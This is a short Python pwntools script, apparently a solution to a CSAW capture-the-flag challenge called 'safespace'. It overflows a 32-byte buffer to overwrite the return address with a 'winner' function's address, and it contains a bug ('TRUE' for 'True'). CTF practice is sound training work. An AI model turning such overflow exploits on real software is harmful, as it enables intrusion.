#solve feast

from pwn import *

local = TRUE

if local:
    p = remote('localhost', 8000)
else:
    p = remote('pwn.chal.csaw.io', 1002)

e = ELF('./safespace')

p.recvline()
p.sendline('A' * 32 + p64(e.sym['winner_winner_chicken_dinner']))